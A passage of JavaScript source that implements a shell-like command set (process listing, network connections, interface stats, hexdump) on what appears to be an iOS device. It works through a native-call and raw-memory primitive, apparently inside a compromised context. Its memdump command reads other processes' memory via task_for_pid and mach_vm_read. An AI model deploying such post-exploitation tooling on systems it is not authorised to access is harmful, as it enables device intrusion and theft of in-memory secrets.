bytes[2]===0x4E && bytes[3]===0x47) return { code: 0, out: path + \": PNG image data\\n\", err: \"\" };\n\t\tif (bytes[0]===0xFF && bytes[1]===0xD8 && bytes[2]===0xFF) return { code: 0, out: path + \": JPEG image data\\n\", err: \"\" };\n\t\tif (bytes[0]===0x50 && bytes[1]===0x4B && bytes[2]===0x03 && bytes[3]===0x04) return { code: 0, out: path + \": Zip archive\\n\", err: \"\" };\n\t\tif (bytes[0]===0x53 && bytes[1]===0x51 && bytes[2]===0x4C && bytes[3]===0x69) return { code: 0, out: path + \": SQLite 3.x database\\n\", err: \"\" };\n\t\tif (bytes[0]===0x62 && bytes[1]===0x70 && bytes[2]===0x6C && bytes[3]===0x69) return { code: 0, out: path + \": Apple binary property list\\n\", err: \"\" };\n\t\tif (bytes[0]===0x3C && bytes[1]===0x3F && bytes[2]===0x78 && bytes[3]===0x6D) return { code: 0, out: path + \": XML document\\n\", err: \"\" };\n\t}\n\tvar isText = true;\n\tfor (var i = 0; i < Math.min(bytes.length, 256); i++) {\n\t\tif (bytes[i] < 9 || (bytes[i] > 13 && bytes[i] < 32 && bytes[i] !== 27)) { isText = false; break; }\n\t}\n\tif (isText) return { code: 0, out: path + \": ASCII text\\n\", err: \"\" };\n\treturn { code: 0, out: path + \": data\\n\", err: \"\" };\n}\n\nfunction _cmdHexdump(args) {\n\tvar maxBytes = 256, file = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-n\" && i + 1 < args.length) { maxBytes = parseInt(args[++i]); }\n\t\telse if (args[i].charAt(0) !== '-') file = args[i];\n\t}\n\tif (!file) return { code: 1, out: \"\", err: \"hexdump: missing operand\\n\" };\n\tvar path = _resolvePath(file);\n\tvar bytes = _readFileBytes(path, maxBytes);\n\tif (!bytes) return { code: 1, out: \"\", err: \"hexdump: \" + path + \": No such file or directory\\n\" };\n\tvar out = \"\";\n\tfor (var i = 0; i < bytes.length; i += 16) {\n\t\tvar addr = (\"00000000\" + i.toString(16)).slice(-8);\n\t\tvar hex = \"\", ascii = \"\";\n\t\tfor (var j = 0; j < 16; j++) {\n\t\t\tif (i + j < bytes.length) {\n\t\t\t\thex += (\"0\" + bytes[i + j].toString(16)).slice(-2) + \" \";\n\t\t\t\tascii += (bytes[i + j] >= 32 && bytes[i + j] < 127) ? String.fromCharCode(bytes[i + j]) : \".\";\n\t\t\t} else { hex += \"   \"; }\n\t\t\tif (j === 7) hex += \" \";\n\t\t}\n\t\tout += addr + \"  \" + hex + \" |\" + ascii + \"|\\n\";\n\t}\n\treturn { code: 0, out: out, err: \"\" };\n}\n\n// ---- System Info Commands ----\n\nfunction _cmdWhoami() {\n\tvar uid = Number(Native.callSymbol(\"getuid\"));\n\treturn { code: 0, out: (uid === 0 ? \"root\" : \"mobile\") + \"\\n\", err: \"\" };\n}\n\nfunction _cmdId() {\n\tvar uid = Number(Native.callSymbol(\"getuid\"));\n\tvar gid = Number(Native.callSymbol(\"getgid\"));\n\tvar euid = Number(Native.callSymbol(\"geteuid\"));\n\tvar egid = Number(Native.callSymbol(\"getegid\"));\n\tvar uname = uid === 0 ? \"root\" : \"mobile\";\n\tvar gname = gid === 0 ? \"wheel\" : gid === 501 ? \"mobile\" : \"\" + gid;\n\tvar out = \"uid=\" + uid + \"(\" + uname + \") gid=\" + gid + \"(\" + gname + \")\";\n\tif (euid !== uid) out += \" euid=\" + euid;\n\tif (egid !== gid) out += \" egid=\" + egid;\n\treturn { code: 0, out: out + \"\\n\", err: \"\" };\n}\n\nfunction _cmdUname(args) {\n\tvar all = false;\n\tfor (var i = 1; i < args.length; i++) if (args[i] === \"-a\") all = true;\n\tvar uts = Native.callSymbol(\"calloc\", 1, 1536);\n\tif (!uts || uts === 0n) return { code: 1, out: \"\", err: \"uname: failed\\n\" };\n\ttry {\n\t\tNative.callSymbol(\"uname\", uts);\n\t\tvar sysname  = Native.readString(uts, 256).replace(/\\0/g, \"\");\n\t\tvar nodename = Native.readString(uts + 256n, 256).replace(/\\0/g, \"\");\n\t\tvar release  = Native.readString(uts + 512n, 256).replace(/\\0/g, \"\");\n\t\tvar version  = Native.readString(uts + 768n, 256).replace(/\\0/g, \"\");\n\t\tvar machine  = Native.readString(uts + 1024n, 256).replace(/\\0/g, \"\");\n\t\tif (all) return { code: 0, out: sysname + \" \" + nodename + \" \" + release + \" \" + version + \" \" + machine + \"\\n\", err: \"\" };\n\t\treturn { code: 0, out: sysname + \"\\n\", err: \"\" };\n\t} finally { Native.callSymbol(\"free\", uts); }\n}\n\nfunction _cmdHostname() {\n\tvar buf = Native.callSymbol(\"malloc\", 256);\n\tif (!buf || buf === 0n) return { code: 1, out: \"\", err: \"hostname: failed\\n\" };\n\ttry {\n\t\tvar r = Number(Native.callSymbol(\"gethostname\", buf, 255));\n\t\tif (r !== 0) return { code: 1, out: \"\", err: \"hostname: failed\\n\" };\n\t\treturn { code: 0, out: Native.readString(buf, 256).replace(/\\0/g, \"\") + \"\\n\", err: \"\" };\n\t} finally { Native.callSymbol(\"free\", buf); }\n}\n\nfunction _cmdDf(args) {\n\tvar human = false;\n\tfor (var i = 1; i < args.length; i++) if (args[i] === \"-h\") human = true;\n\tvar sb = Native.callSymbol(\"calloc\", 1, 4096);\n\tif (!sb || sb === 0n) return { code: 1, out: \"\", err: \"df: failed\\n\" };\n\ttry {\n\t\tvar r = Number(Native.callSymbol(\"statfs\", \"/\", sb));\n\t\tif (r !== 0) return { code: 1, out: \"\", err: \"df: statfs failed\\n\" };\n\t\tvar bsRaw = new DataView(Native.read(BigInt(sb), 4));\n\t\tvar bsize  = bsRaw.getUint32(0, true);\n\t\tvar blocks = Number(Native.readPtr(BigInt(sb) + 8n));\n\t\tvar bfree  = Number(Native.readPtr(BigInt(sb) + 16n));\n\t\tvar bavail = Number(Native.readPtr(BigInt(sb) + 24n));\n\t\tvar total = blocks * bsize, free = bfree * bsize;\n\t\tvar used = total - free, avail = bavail * bsize;\n\t\tvar pct = total > 0 ? Math.round(used * 100 / total) : 0;\n\t\tvar out = \"Filesystem\\tSize\\tUsed\\tAvail\\tUse%\\tMounted on\\n\";\n\t\tif (human) {\n\t\t\tout += \"/dev/disk0s1\\t\" + _fmtSizeH(total) + \"\\t\" + _fmtSizeH(used) + \"\\t\" + _fmtSizeH(avail) + \"\\t\" + pct + \"%\\t/\\n\";\n\t\t} else {\n\t\t\tout += \"/dev/disk0s1\\t\" + (total/1024|0) + \"\\t\" + (used/1024|0) + \"\\t\" + (avail/1024|0) + \"\\t\" + pct + \"%\\t/\\n\";\n\t\t}\n\t\treturn { code: 0, out: out, err: \"\" };\n\t} finally { Native.callSymbol(\"free\", sb); }\n}\n\nfunction _cmdDate() {\n\tvar now = new Date();\n\treturn { code: 0, out: now.toISOString().replace(\"T\", \" \").replace(\"Z\", \" UTC\") + \"\\n\", err: \"\" };\n}\n\nfunction _cmdEcho(args) {\n\treturn { code: 0, out: args.slice(1).join(\" \") + \"\\n\", err: \"\" };\n}\n\n// ---- Process Commands ----\n\nfunction _cmdPs(args) {\n\tvar pidBufSize = 4 * 8192;\n\tvar pidBuf = Native.callSymbol(\"malloc\", BigInt(pidBufSize));\n\tif (!pidBuf || pidBuf === 0n) return { code: 1, out: \"\", err: \"ps: malloc failed\\n\" };\n\n\tvar count = Number(Native.callSymbol(\"proc_listallpids\", pidBuf, pidBufSize));\n\tif (count <= 0) {\n\t\tNative.callSymbol(\"free\", pidBuf);\n\t\treturn { code: 1, out: \"\", err: \"ps: proc_listallpids failed\\n\" };\n\t}\n\tif (count > 8192) count = 8192;\n\n\tvar pids = [];\n\tfor (var i = 0; i < count; i++) {\n\t\tvar pid = Native.read32(BigInt(pidBuf) + BigInt(i * 4));\n\t\tif (pid > 0) pids.push(pid);\n\t}\n\tNative.callSymbol(\"free\", pidBuf);\n\tpids.sort(function(a, b) { return a - b; });\n\n\tvar nameBuf = Native.callSymbol(\"malloc\", 256);\n\tif (!nameBuf || nameBuf === 0n) return { code: 1, out: \"\", err: \"ps: malloc failed\\n\" };\n\n\tvar out = \"  PID\\tNAME\\n\";\n\tfor (var pi = 0; pi < pids.length; pi++) {\n\t\ttry {\n\t\t\tNative.callSymbol(\"memset\", nameBuf, 0, 256);\n\t\t\tvar nameLen = Number(Native.callSymbol(\"proc_name\", pids[pi], nameBuf, 255));\n\t\t\tvar name = nameLen > 0 ? Native.readString(BigInt(nameBuf), 255) : \"?\";\n\t\t\tout += \"  \" + pids[pi] + \"\\t\" + name + \"\\n\";\n\t\t} catch (procErr) {\n\t\t\tout += \"  \" + pids[pi] + \"\\t(error)\\n\";\n\t\t}\n\t}\n\tNative.callSymbol(\"free\", nameBuf);\n\tout += \"\\nTotal: \" + pids.length + \" processes\\n\";\n\n\treturn { code: 0, out: out, err: \"\" };\n}\n\nfunction _cmdMemdump(args) {\n\tif (args.length < 4) return { code: 1, out: \"\", err: \"memdump: usage: memdump <pid> <hex_address> <size>\\n  Address in hex (0x...). Max dump display 4KB, max read 1MB.\\n\" };\n\n\tvar pid = parseInt(args[1]);\n\tvar addrStr = args[2];\n\tvar address = (addrStr.indexOf(\"0x\") === 0 || addrStr.indexOf(\"0X\") === 0)\n\t\t? parseInt(addrStr, 16) : parseInt(addrStr);\n\tvar size = parseInt(args[3]);\n\n\tif (isNaN(pid) || pid <= 0) return { code: 1, out: \"\", err: \"memdump: invalid pid\\n\" };\n\tif (isNaN(address)) return { code: 1, out: \"\", err: \"memdump: invalid address\\n\" };\n\tif (isNaN(size) || size <= 0) return { code: 1, out: \"\", err: \"memdump: invalid size\\n\" };\n\tif (size > 1024 * 1024) return { code: 1, out: \"\", err: \"memdump: size too large (max 1MB)\\n\" };\n\n\tvar selfPortAddr = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"mach_task_self_\");\n\tif (!selfPortAddr || selfPortAddr === 0n) return { code: 1, out: \"\", err: \"memdump: cannot resolve mach_task_self_\\n\" };\n\tvar selfPort = Native.read32(BigInt(selfPortAddr));\n\n\tvar taskPtr = Native.callSymbol(\"calloc\", 1, 8);\n\tif (!taskPtr || taskPtr === 0n) return { code: 1, out: \"\", err: \"memdump: malloc failed\\n\" };\n\n\tvar kr = Number(Native.callSymbol(\"task_for_pid\", selfPort, pid, taskPtr));\n\tif (kr !== 0) {\n\t\tNative.callSymbol(\"free\", taskPtr);\n\t\treturn { code: 1, out: \"\", err: \"memdump: task_for_pid failed (kern_return=\" + kr + \")\\n\" };\n\t}\n\tvar task = Native.read32(BigInt(taskPtr));\n\tNative.callSymbol(\"free\", taskPtr);\n\n\tvar dataOutPtr = Native.callSymbol(\"calloc\", 1, 8);\n\tvar cntOutPtr = Native.callSymbol(\"calloc\", 1, 4);\n\tif (!dataOutPtr || dataOutPtr === 0n || !cntOutPtr || cntOutPtr === 0n) {\n\t\tNative.callSymbol(\"mach_port_deallocate\", selfPort, task);\n\t\tif (dataOutPtr) Native.callSymbol(\"free\", dataOutPtr);\n\t\tif (cntOutPtr) Native.callSymbol(\"free\", cntOutPtr);\n\t\treturn { code: 1, out: \"\", err: \"memdump: malloc failed\\n\" };\n\t}\n\n\tkr = Number(Native.callSymbol(\"mach_vm_read\", task, BigInt(address), BigInt(size), dataOutPtr, cntOutPtr));\n\tif (kr !== 0) {\n\t\tNative.callSymbol(\"free\", dataOutPtr);\n\t\tNative.callSymbol(\"free\", cntOutPtr);\n\t\tNative.callSymbol(\"mach_port_deallocate\", selfPort, task);\n\t\treturn { code: 1, out: \"\", err: \"memdump: mach_vm_read failed (kern_return=\" + kr + \")\\n\" };\n\t}\n\n\tvar dataAddr = Native.readPtr(BigInt(dataOutPtr));\n\tvar dataCnt = _readU32(BigInt(cntOutPtr), 0);\n\tNative.callSymbol(\"free\", dataOutPtr);\n\tNative.callSymbol(\"free\", cntOutPtr);\n\n\tvar readSize = dataCnt < size ? dataCnt : size;\n\tvar bytes = new Uint8Array(Native.read(dataAddr, readSize));\n\n\tNative.callSymbol(\"mach_vm_deallocate\", selfPort, dataAddr, BigInt(dataCnt));\n\tNative.callSymbol(\"mach_port_deallocate\", selfPort, task);\n\n\tvar maxShow = readSize > 4096 ? 4096 : readSize;\n\tvar out = \"\";\n\tfor (var i = 0; i < maxShow; i += 16) {\n\t\tvar a = (address + i).toString(16);\n\t\twhile (a.length < 8) a = \"0\" + a;\n\t\tvar hex = \"\", ascii = \"\";\n\t\tfor (var j = 0; j < 16; j++) {\n\t\t\tif (i + j < maxShow) {\n\t\t\t\tvar hx = bytes[i + j].toString(16);\n\t\t\t\thex += (hx.length < 2 ? \"0\" + hx : hx) + \" \";\n\t\t\t\tascii += (bytes[i + j] >= 32 && bytes[i + j] < 127) ? String.fromCharCode(bytes[i + j]) : \".\";\n\t\t\t} else { hex += \"   \"; }\n\t\t\tif (j === 7) hex += \" \";\n\t\t}\n\t\tout += a + \"  \" + hex + \" |\" + ascii + \"|\\n\";\n\t}\n\tif (readSize > maxShow) out += \"\\n... truncated (read \" + readSize + \" bytes, showing \" + maxShow + \")\\n\";\n\tout += \"\\n\" + readSize + \" bytes read from pid \" + pid + \" at 0x\" + address.toString(16) + \"\\n\";\n\n\treturn { code: 0, out: out, err: \"\" };\n}\n\n// ---- Network Commands ----\n\nfunction _cmdIfconfig(args) {\n\tvar ifapPtr = Native.callSymbol(\"calloc\", 1, 8);\n\tif (!ifapPtr || ifapPtr === 0n) return { code: 1, out: \"\", err: \"ifconfig: malloc failed\\n\" };\n\n\tvar r = Number(Native.callSymbol(\"getifaddrs\", ifapPtr));\n\tif (r !== 0) {\n\t\tNative.callSymbol(\"free\", ifapPtr);\n\t\treturn { code: 1, out: \"\", err: \"ifconfig: getifaddrs failed\\n\" };\n\t}\n\n\tvar ifaHead = Native.readPtr(BigInt(ifapPtr));\n\tNative.callSymbol(\"free\", ifapPtr);\n\tif (!ifaHead || ifaHead === 0n) return { code: 0, out: \"(no interfaces)\\n\", err: \"\" };\n\n\tvar ifMap = {};\n\tvar ifOrder = [];\n\tvar ifa = ifaHead;\n\tvar maxIter = 1024;\n\n\twhile (ifa && ifa !== 0n && maxIter-- > 0) {\n\t\ttry {\n\t\t\tvar namePtr = Native.readPtr(ifa + 8n);\n\t\t\tvar name = (namePtr && namePtr !== 0n) ? Native.readString(namePtr, 32) : \"?\";\n\t\t\tvar flags = _readU32(ifa, 16);\n\t\t\tvar addrPtr = Native.readPtr(ifa + 24n);\n\n\t\t\tif (!ifMap[name]) {\n\t\t\t\tifMap[name] = { flags: flags, addrs: [], mtu: 0 };\n\t\t\t\tifOrder.push(name);\n\t\t\t}\n\n\t\t\tif (addrPtr && addrPtr !== 0n) {\n\t\t\t\tvar family = _readU8(addrPtr, 1);\n\n\t\t\t\tif (family === 2) {\n\t\t\t\t\tvar ab = new Uint8Array(Native.read(addrPtr + 4n, 4));\n\t\t\t\t\tvar ip = ab[0] + \".\" + ab[1] + \".\" + ab[2] + \".\" + ab[3];\n\t\t\t\t\tvar entry = { type: \"inet\", addr: ip };\n\t\t\t\t\tvar maskPtr = Native.readPtr(ifa + 32n);\n\t\t\t\t\tif (maskPtr && maskPtr !== 0n) {\n\t\t\t\t\t\tvar mb = new Uint8Array(Native.read(maskPtr + 4n, 4));\n\t\t\t\t\t\tentry.mask = mb[0] + \".\" + mb[1] + \".\" + mb[2] + \".\" + mb[3];\n\t\t\t\t\t}\n\t\t\t\t\tifMap[name].addrs.push(entry);\n\t\t\t\t} else if (family === 30) {\n\t\t\t\t\tvar a6 = new Uint8Array(Native.read(addrPtr + 8n, 16));\n\t\t\t\t\tvar v6 = \"\";\n\t\t\t\t\tfor (var k = 0; k < 16; k += 2) {\n\t\t\t\t\t\tif (k > 0) v6 += \":\";\n\t\t\t\t\t\tv6 += ((a6[k] << 8) | a6[k + 1]).toString(16);\n\t\t\t\t\t}\n\t\t\t\t\tifMap[name].addrs.push({ type: \"inet6\", addr: v6 });\n\t\t\t\t} else if (family === 18) {\n\t\t\t\t\tvar dataPtr = Native.readPtr(ifa + 48n);\n\t\t\t\t\tif (dataPtr && dataPtr !== 0n) {\n\t\t\t\t\t\tifMap[name].mtu = _readU32(dataPtr, 8);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (iterErr) { /* skip this entry on error */ }\n\n\t\tifa = Native.readPtr(ifa);\n\t}\n\n\tNative.callSymbol(\"freeifaddrs\", ifaHead);\n\n\tvar out = \"\";\n\tfor (var oi = 0; oi < ifOrder.length; oi++) {\n\t\tvar n = ifOrder[oi];\n\t\tvar inf = ifMap[n];\n\t\tvar fl = [];\n\t\tif (inf.flags & 0x1) fl.push(\"UP\");\n\t\tif (inf.flags & 0x2) fl.push(\"BROADCAST\");\n\t\tif (inf.flags & 0x8) fl.push(\"LOOPBACK\");\n\t\tif (inf.flags & 0x10) fl.push(\"POINTOPOINT\");\n\t\tif (inf.flags & 0x40) fl.push(\"RUNNING\");\n\t\tif (inf.flags & 0x8000) fl.push(\"MULTICAST\");\n\t\tout += n + \": flags=0x\" + inf.flags.toString(16) + \" <\" + fl.join(\",\") + \">\";\n\t\tif (inf.mtu > 0) out += \" mtu \" + inf.mtu;\n\t\tout += \"\\n\";\n\t\tfor (var ai = 0; ai < inf.addrs.length; ai++) {\n\t\t\tvar ad = inf.addrs[ai];\n\t\t\tif (ad.type === \"inet\") {\n\t\t\t\tout += \"\\tinet \" + ad.addr;\n\t\t\t\tif (ad.mask) out += \" netmask \" + ad.mask;\n\t\t\t\tout += \"\\n\";\n\t\t\t} else if (ad.type === \"inet6\") {\n\t\t\t\tout += \"\\tinet6 \" + ad.addr + \"\\n\";\n\t\t\t}\n\t\t}\n\t}\n\n\treturn { code: 0, out: out, err: \"\" };\n}\n\nfunction _cmdNetstats(args) {\n\tvar ifapPtr = Native.callSymbol(\"calloc\", 1, 8);\n\tif (!ifapPtr || ifapPtr === 0n) return { code: 1, out: \"\", err: \"netstats: malloc failed\\n\" };\n\n\tvar r = Number(Native.callSymbol(\"getifaddrs\", ifapPtr));\n\tif (r !== 0) {\n\t\tNative.callSymbol(\"free\", ifapPtr);\n\t\treturn { code: 1, out: \"\", err: \"netstats: getifaddrs failed\\n\" };\n\t}\n\n\tvar ifaHead = Native.readPtr(BigInt(ifapPtr));\n\tNative.callSymbol(\"free\", ifapPtr);\n\tif (!ifaHead || ifaHead === 0n) return { code: 0, out: \"(no interfaces)\\n\", err: \"\" };\n\n\tvar stats = {};\n\tvar order = [];\n\tvar ifa = ifaHead;\n\tvar maxIter = 1024;\n\n\twhile (ifa && ifa !== 0n && maxIter-- > 0) {\n\t\ttry {\n\t\t\tvar namePtr = Native.readPtr(ifa + 8n);\n\t\t\tvar name = (namePtr && namePtr !== 0n) ? Native.readString(namePtr, 32) : \"?\";\n\t\t\tvar addrPtr = Native.readPtr(ifa + 24n);\n\n\t\t\tif (addrPtr && addrPtr !== 0n) {\n\t\t\t\tvar family = _readU8(addrPtr, 1);\n\t\t\t\tif (family === 18) {\n\t\t\t\t\tvar dataPtr = Native.readPtr(ifa + 48n);\n\t\t\t\t\tif (dataPtr && dataPtr !== 0n) {\n\t\t\t\t\t\tif (!stats[name]) order.push(name);\n\t\t\t\t\t\tstats[name] = {\n\t\t\t\t\t\t\tmtu: _readU32(dataPtr, 8),\n\t\t\t\t\t\t\tipackets: _readU32(dataPtr, 20),\n\t\t\t\t\t\t\tierrors: _readU32(dataPtr, 24),\n\t\t\t\t\t\t\topackets: _readU32(dataPtr, 28),\n\t\t\t\t\t\t\toerrors: _readU32(dataPtr, 32),\n\t\t\t\t\t\t\tcollisions: _readU32(dataPtr, 36),\n\t\t\t\t\t\t\tibytes: _readU32(dataPtr, 40),\n\t\t\t\t\t\t\tobytes: _readU32(dataPtr, 44)\n\t\t\t\t\t\t};\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (iterErr) { /* skip on error */ }\n\n\t\tifa = Native.readPtr(ifa);\n\t}\n\n\tNative.callSymbol(\"freeifaddrs\", ifaHead);\n\n\tvar out = \"Interface\\tRX bytes\\tTX bytes\\tRX pkts\\t\\tTX pkts\\t\\tRX err\\tTX err\\n\";\n\tvar totalRx = 0, totalTx = 0;\n\tfor (var si = 0; si < order.length; si++) {\n\t\tvar sn = order[si];\n\t\tvar s = stats[sn];\n\t\tout += sn + \"\\t\\t\" + _fmtSizeH(s.ibytes) + \"\\t\\t\" + _fmtSizeH(s.obytes)\n\t\t\t+ \"\\t\\t\" + s.ipackets + \"\\t\\t\" + s.opackets\n\t\t\t+ \"\\t\\t\" + s.ierrors + \"\\t\" + s.oerrors + \"\\n\";\n\t\ttotalRx += s.ibytes;\n\t\ttotalTx += s.obytes;\n\t}\n\tout += \"\\nTotal RX: \" + _fmtSizeH(totalRx) + \"  TX: \" + _fmtSizeH(totalTx) + \"\\n\";\n\n\tout += \"\\nNetwork type summary:\\n\";\n\tfor (var ni = 0; ni < order.length; ni++) {\n\t\tvar nn = order[ni];\n\t\tvar ns = stats[nn];\n\t\tif (ns.ibytes === 0 && ns.obytes === 0) continue;\n\t\tvar netType = \"other\";\n\t\tif (nn === \"en0\") netType = \"WiFi\";\n\t\telse if (nn === \"lo0\") netType = \"Loopback\";\n\t\telse if (nn.indexOf(\"pdp_ip\") === 0) netType = \"Cellular\";\n\t\telse if (nn.indexOf(\"utun\") === 0) netType = \"VPN/Tunnel\";\n\t\telse if (nn.indexOf(\"ipsec\") === 0) netType = \"IPSec\";\n\t\telse if (nn.indexOf(\"en\") === 0) netType = \"Ethernet\";\n\t\telse if (nn.indexOf(\"awdl\") === 0) netType = \"AWDL (AirDrop)\";\n\t\tout += \"  \" + nn + \" (\" + netType + \"): RX \" + _fmtSizeH(ns.ibytes) + \" / TX \" + _fmtSizeH(ns.obytes) + \"\\n\";\n\t}\n\n\treturn { code: 0, out: out, err: \"\" };\n}\n\n// ---- Network Connection Commands ----\n\nfunction _fmtIPv6Short(data, off) {\n\tvar parts = [];\n\tfor (var i = 0; i < 16; i += 2) {\n\t\tparts.push(((data[off + i] << 8) | data[off + i + 1]).toString(16));\n\t}\n\treturn parts.join(\":\");\n}\n\nfunction _getSysctlPcbList(name) {\n\tvar sizePtr = Native.callSymbol(\"calloc\", 1, 8);\n\tif (!sizePtr || sizePtr === 0n) return null;\n\n\tvar rc = Number(Native.callSymbol(\"sysctlbyname\", name, 0, sizePtr, 0, 0));\n\tif (rc !== 0) { Native.callSymbol(\"free\", sizePtr); return null; }\n\n\tvar dataSize = Number(Native.readPtr(BigInt(sizePtr)));\n\tif (dataSize <= 0 || dataSize > 10 * 1024 * 1024) { Native.callSymbol(\"free\", sizePtr); return null; }\n\n\tvar allocSize = dataSize + 4096;\n\tvar dataBuf = Native.callSymbol(\"malloc\", BigInt(allocSize));\n\tif (!dataBuf || dataBuf === 0n) { Native.callSymbol(\"free\", sizePtr); return null; }\n\n\tNative.write64(sizePtr, BigInt(allocSize));\n\trc = Number(Native.callSymbol(\"sysctlbyname\", name, dataBuf, sizePtr, 0, 0));\n\tvar actualSize = Number(Native.readPtr(BigInt(sizePtr)));\n\tNative.callSymbol(\"free\", sizePtr);\n\n\tif (rc !== 0) { Native.callSymbol(\"free\", dataBuf); return null; }\n\treturn { buf: dataBuf, size: actualSize };\n}\n\nfunction _parseConnections(dataBuf, dataSize, isTcp) {\n\tvar XSO_INPCB = 0x010, XSO_TCPCB = 0x020;\n\tvar conns = [];\n\n\tif (dataSize < 24) return conns;\n\tvar headerLen = _readU32(dataBuf, 0);\n\tif (headerLen < 16 || headerLen > 256) return conns;\n\n\tvar off = headerLen;\n\tvar cur = null;\n\tvar maxIter = 50000;\n\n\twhile (off + 8 <= dataSize && maxIter-- > 0) {\n\t\tvar eLen = _readU32(dataBuf, off);\n\t\tvar eKind = _readU32(dataBuf, off + 4);\n\t\tif (eLen < 8 || eLen > 8192 || off + eLen > dataSize) break;\n\n\t\ttry {\n\t\t\tif (isTcp && eKind === XSO_TCPCB) {\n\t\t\t\tif (cur) conns.push(cur);\n\t\t\t\tcur = { state: -1, laddr: \"\", faddr: \"\", lport: 0, fport: 0, vflag: 0 };\n\t\t\t\tif (eLen >= 40) cur.state = _readU32(dataBuf, off + 36);\n\t\t\t} else if (eKind === XSO_INPCB) {\n\t\t\t\tif (!isTcp) {\n\t\t\t\t\tif (cur) conns.push(cur);\n\t\t\t\t\tcur = { state: -1, laddr: \"\", faddr: \"\", lport: 0, fport: 0, vflag: 0 };\n\t\t\t\t}\n\t\t\t\tif (cur && eLen >= 84) {\n\t\t\t\t\tcur.fport = (_readU8(dataBuf, off + 16) << 8) | _readU8(dataBuf, off + 17);\n\t\t\t\t\tcur.lport = (_readU8(dataBuf, off + 18) << 8) | _readU8(dataBuf, off + 19);\n\t\t\t\t\tcur.vflag = _readU8(dataBuf, off + 48);\n\n\t\t\t\t\tif (cur.vflag & 1) {\n\t\t\t\t\t\tvar la = new Uint8Array(Native.read(dataBuf + BigInt(off + 64), 4));\n\t\t\t\t\t\tvar fa = new Uint8Array(Native.read(dataBuf + BigInt(off + 80), 4));\n\t\t\t\t\t\tcur.laddr = la[0] + \".\" + la[1] + \".\" + la[2] + \".\" + la[3];\n\t\t\t\t\t\tcur.faddr = fa[0] + \".\" + fa[1] + \".\" + fa[2] + \".\" + fa[3];\n\t\t\t\t\t} else if (cur.vflag & 2) {\n\t\t\t\t\t\tvar la6 = new Uint8Array(Native.read(dataBuf + BigInt(off + 52), 16));\n\t\t\t\t\t\tvar fa6 = new Uint8Array(Native.read(dataBuf + BigInt(off + 68), 16));\n\t\t\t\t\t\tcur.laddr = _fmtIPv6Short(la6, 0);\n\t\t\t\t\t\tcur.faddr = _fmtIPv6Short(fa6, 0);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (parseErr) { /* skip malformed entry */ }\n\n\t\toff += eLen;\n\t}\n\tif (cur) conns.push(cur);\n\treturn conns;\n}\n\nfunction _cmdConnections(args) {\n\tvar showTcp = true, showUdp = true, showListen = false, showAll = false;\n\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-t\") { showTcp = true; showUdp = false; }\n\t\telse if (args[i] === \"-u\") { showTcp = false; showUdp = true; }\n\t\telse if (args[i] === \"-a\") showAll = true;\n\t\telse if (args[i] === \"-l\") showListen = true;\n\t\telse if (args[i] === \"-h\" || args[i] === \"--help\") {\n\t\t\treturn { code: 0, out:\n\t\t\t\t\"Usage: connections [-t] [-u] [-a] [-l]\\n\" +\n\t\t\t\t\"  -t         Show TCP connections only\\n\" +\n\t\t\t\t\"  -u         Show UDP sockets only\\n\" +\n\t\t\t\t\"  -a         Show all (including LISTEN, TIME_WAIT, CLOSED)\\n\" +\n\t\t\t\t\"  -l         Show only LISTEN sockets\\n\" +\n\t\t\t\t\"  Default: show TCP+UDP, hide LISTEN/TIME_WAIT/CLOSED\\n\", err: \"\" };\n\t\t}\n\t}\n\n\tvar tcpStates = [\"CLOSED\", \"LISTEN\", \"SYN_SENT\", \"SYN_RCVD\", \"ESTABLISHED\",\n\t\t\"CLOSE_WAIT\", \"FIN_WAIT_1\", \"CLOSING\", \"LAST_ACK\", \"FIN_WAIT_2\", \"TIME_WAIT\"];\n\n\tvar out = \"Proto  Local Address                Foreign Address              State\\n\";\n\tout += \"-----  -------------------------    -------------------------    -----------\\n\";\n\tvar total = 0;\n\n\tif (showTcp) {\n\t\tvar tcpData = _getSysctlPcbList(\"net.inet.tcp.pcblist_n\");\n\t\tif (tcpData) {\n\t\t\tvar tcpConns = _parseConnections(tcpData.buf, tcpData.size, true);\n\t\t\tNative.callSymbol(\"free\", tcpData.buf);\n\n\t\t\tfor (var ci = 0; ci < tcpConns.length; ci++) {\n\t\t\t\tvar c = tcpConns[ci];\n\t\t\t\tvar st = (c.state >= 0 && c.state < tcpStates.length) ? tcpStates[c.state] : \"?\" + c.state;\n\n\t\t\t\tif (!showAll) {\n\t\t\t\t\tif (showListen && st !== \"LISTEN\") continue;\n\t\t\t\t\tif (!showListen && (st === \"TIME_WAIT\" || st === \"CLOSED\" || st === \"LISTEN\")) continue;\n\t\t\t\t}\n\n\t\t\t\tvar p = (c.vflag & 2) ? \"tcp6   \" : \"tcp4   \";\n\t\t\t\tvar ls = c.laddr + \":\" + c.lport;\n\t\t\t\tvar fs = c.faddr + \":\" + c.fport;\n\t\t\t\twhile (ls.length < 28) ls += \" \";\n\t\t\t\twhile (fs.length < 28) fs += \" \";\n\t\t\t\tout += p + ls + fs + st + \"\\n\";\n\t\t\t\ttotal++;\n\t\t\t}\n\t\t} else {\n\t\t\tout += \"(tcp: sysctl net.inet.tcp.pcblist_n failed)\\n\";\n\t\t}\n\t}\n\n\tif (showUdp) {\n\t\tvar udpData = _getSysctlPcbList(\"net.inet.udp.pcblist_n\");\n\t\tif (udpData) {\n\t\t\tvar udpConns = _parseConnections(udpData.buf, udpData.size, false);\n\t\t\tNative.callSymbol(\"free\", udpData.buf);\n\n\t\t\tfor (var ci = 0; ci < udpConns.length; ci++) {\n\t\t\t\tvar c = udpConns[ci];\n\t\t\t\tif (!showAll && c.lport === 0 && c.fport === 0) continue;\n\n\t\t\t\tvar p = (c.vflag & 2) ? \"udp6   \" : \"udp4   \";\n\t\t\t\tvar ls = c.laddr + \":\" + c.lport;\n\t\t\t\tvar fs = c.faddr + \":\" + c.fport;\n\t\t\t\twhile (ls.length < 28) ls += \" \";\n\t\t\t\twhile (fs.length < 28) fs += \" \";\n\t\t\t\tout += p + ls + fs + \"\\n\";\n\t\t\t\ttotal++;\n\t\t\t}\n\t\t} else {\n\t\t\tout += \"(udp: sysctl net.inet.udp.pcblist_n failed)\\n\";\n\t\t}\n\t}\n\n\tout += \"\\nTotal: \" + total + 